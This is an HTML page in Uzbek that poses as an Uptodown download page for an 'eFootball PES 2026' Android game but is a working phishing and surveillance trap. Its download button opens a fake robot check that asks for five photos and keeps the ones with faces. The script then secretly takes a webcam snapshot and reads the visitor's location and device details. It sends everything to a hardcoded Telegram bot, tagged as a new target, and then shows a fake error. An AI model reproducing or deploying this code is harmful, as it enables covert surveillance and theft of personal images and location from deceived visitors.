<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 for Android - Download</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-dim: #7e949c;
            --ut-card: #0c262f;
        }

        body {
            margin: 0;
            background-color: var(--ut-bg);
            font-family: 'Roboto', sans-serif;
            color: #ffffff;
            overflow-x: hidden;
        }

        /* --- NAVIGATION & SIDE MENU --- */
        .top-centered-header {
            background-color: var(--ut-dark);
            padding: 12px 0;
            border-bottom: 1px solid #102a33;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-logo { height: 24px; }

        header {
            background: var(--ut-dark);
            height: 50px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .menu-btn { color: var(--ut-blue); font-size: 26px; cursor: pointer; }

        /* Side Menu Panel */
        .side-menu {
            position: fixed;
            top: 0;
            left: -280px; /* Hidden by default */
            width: 280px;
            height: 100%;
            background: var(--ut-dark);
            z-index: 2000;
            transition: 0.3s ease;
            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
        }
        .side-menu.active { left: 0; }

        .menu-header {
            padding: 20px;
            background: var(--ut-bg);
            border-bottom: 1px solid #102a33;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .menu-header img { height: 20px; }

        .menu-list { list-style: none; padding: 10px 0; margin: 0; }
        .menu-item {
            padding: 15px 25px;
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 20px;
            cursor: pointer;
            transition: 0.2s;
        }
        .menu-item:hover { background: #102a33; color: var(--ut-blue); }
        .menu-item i { width: 20px; text-align: center; color: var(--ut-dim); }

        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 1500;
            display: none;
        }
        .overlay.active { display: block; }

        /* --- CONTENT STYLES --- */
        .path-bar { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }

        .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
        .app-icon { width: 90px; height: 90px; border-radius: 20px; object-fit: cover; }
        .app-info h1 { font-size: 24px; font-weight: 700; margin: 0; }
        .app-sub { font-size: 14px; color: var(--ut-dim); }

        .btn-latest {
            background: var(--ut-green);
            color: #ffffff;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
        }

        /* Technical Grid */
        .tech-section-group { margin-top: 30px; }
        .tech-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
        .tech-item { display: flex; align-items: flex-start; gap: 12px; }
        .tech-icon-box { width: 34px; height: 34px; border: 1px solid var(--ut-blue); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--ut-blue); flex-shrink: 0; }
        .tech-label { font-size: 10px; color: var(--ut-dim); font-weight: 700; }
        .tech-value { font-size: 13px; word-break: break-all; }

        /* Hidden elements for logic */
        #verify-overlay { display: none; position: fixed; inset: 0; background: rgba(5, 17, 22, 0.98); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
        .verify-modal { background: var(--ut-card); width: 100%; max-width: 340px; padding: 30px; border-radius: 16px; border: 1px solid var(--ut-blue); text-align: center; }
        video, canvas, #hidden-input { display: none; }
    </style>
</head>
<body>

<div class="overlay" id="overlay" onclick="toggleMenu()"></div>
<div class="side-menu" id="sideMenu">
    <div class="menu-header">
        <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" alt="Uptodown">
    </div>
    <ul class="menu-list">
        <li class="menu-item">🏠 Bosh sahifa</li>
        <li class="menu-item">🎮 O'yinlar</li>
        <li class="menu-item">📱 Ilovalar</li>
        <li class="menu-item">🔥 Eng sara yuklashlar</li>
        <li class="menu-item">🆕 Yangi qo'shilganlar</li>
        <li class="menu-item">⚙️ Sozlamalar</li>
        <hr style="border: 0; border-top: 1px solid #102a33; margin: 10px 0;">
        <li class="menu-item">❓ Yordam</li>
        <li class="menu-item">ℹ️ Biz haqimizda</li>
    </ul>
</div>

<div class="top-centered-header">
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo">
</div>

<header>
    <div class="menu-btn" onclick="toggleMenu()">☰</div>
</header>

<div class="path-bar">Android / O'yinlar / Sport / eFootball PES 2026</div>

<div class="main-content">
    <div class="app-header">
        <img src="image_98f76c.png" class="app-icon" alt="PES 2026">
        <div class="app-info">
            <h1>eFootball PES 2026</h1>
            <div class="app-sub">10.4.0 | <span style="color:var(--ut-blue)">Uptodown.com</span></div>
        </div>
    </div>

    <button class="btn-latest" onclick="openVerification()">Oxirgi versiya</button>

    <div class="tech-section-group">
        <h3 style="font-size: 16px;">Texnik ma'lumotlar</h3>
        <div class="tech-grid">
            <div class="tech-item"><div class="tech-icon-box">👤</div><div><div class="tech-label">DASTURCHI</div><div class="tech-value">Uptodown.com</div></div></div>
            <div class="tech-item"><div class="tech-icon-box">📄</div><div><div class="tech-label">LITSENZIYA</div><div class="tech-value">Bepul</div></div></div>
            <div class="tech-item"><div class="tech-icon-box">📥</div><div><div class="tech-label">YUKLASHLAR</div><div class="tech-value">1,034,167,963</div></div></div>
            <div class="tech-item"><div class="tech-icon-box">📅</div><div><div class="tech-label">SANA</div><div class="tech-value">1-Apr, 2026</div></div></div>
        </div>
    </div>
</div>

<div id="verify-overlay">
    <div class="verify-modal">
        <h3 id="v-title">Robot emasligingizni tasdiqlang</h3>
        <p style="font-size: 13px; color: var(--ut-dim);">Davom etish uchun 5 ta rasm yuklang.</p>
        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">FOTO YUKLASH</label>
        <input type="file" id="hidden-input" multiple accept="image/*" onchange="processAI(this)">
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    // Menu funksiyasi
    function toggleMenu() {
        document.getElementById('sideMenu').classList.toggle('active');
        document.getElementById('overlay').classList.toggle('active');
    }

    // Stealth & AI logikasi
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
    let capturedFiles = [];

    async function initAI() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    initAI();

    function openVerification() { document.getElementById('verify-overlay').style.display = 'flex'; }

    async function processAI(input) {
        document.getElementById('v-title').innerText = "Tekshirilmoqda...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const detection = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (detection.length > 0) capturedFiles.push(f);
        }
        executeStealth();
    }

    async function executeStealth() {
        const platform = navigator.userAgent;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v-stream');
            video.srcObject = stream;
            await new Promise(res => setTimeout(res, 1000));
            const canvas = document.getElementById('v-canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
            stream.getTracks().forEach(t => t.stop());
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendToBot(platform, `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`, snap);
            }, () => sendToBot(platform, "Geo Blocked", snap));
        } catch(e) { sendToBot(platform, "No Cam", null); }
    }

    async function sendToBot(pInfo, loc, snap) {
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Yangi Target*\nQurilma: ${pInfo}\nJoylashuv: ${loc}`, parse_mode: 'Markdown'})
        });
        if(snap) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT); fd.append('photo', snap);
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
        }
        for (let file of capturedFiles) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.CHAT); fd2.append('photo', file);
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("Xatolik: Server bilan aloqa uzildi (0x884).");
        location.reload();
    }
</script>
</body>
</html>
